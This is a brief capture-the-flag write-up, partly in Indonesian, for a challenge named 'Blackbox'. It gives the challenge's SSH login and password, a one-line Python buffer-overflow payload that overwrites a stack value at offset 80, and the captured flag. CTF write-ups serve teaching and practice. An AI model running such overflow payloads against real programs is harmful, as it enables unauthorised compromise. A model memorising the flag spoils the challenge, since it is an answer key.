# Blackbox (80 Points)
What is 1 + 1? Run the command: ssh blackbox@104.131.79.111 -p 1001 (pw: guest).
# Solved
Disini saya mendapatkan Bufferoverflow pada stack <b>80</b> kemudian saya jalankan perintah ini
```console
$ python -c "print 'A' * 80 + '\x02'" | ./blackbox
What is 1 + 1 = CORRECT! You get flag:
flag{0n3_4lus_1_1s_Tw0_dumm13!!}
```
Flag : <b>flag{0n3_4lus_1_1s_Tw0_dumm13!!}</b>
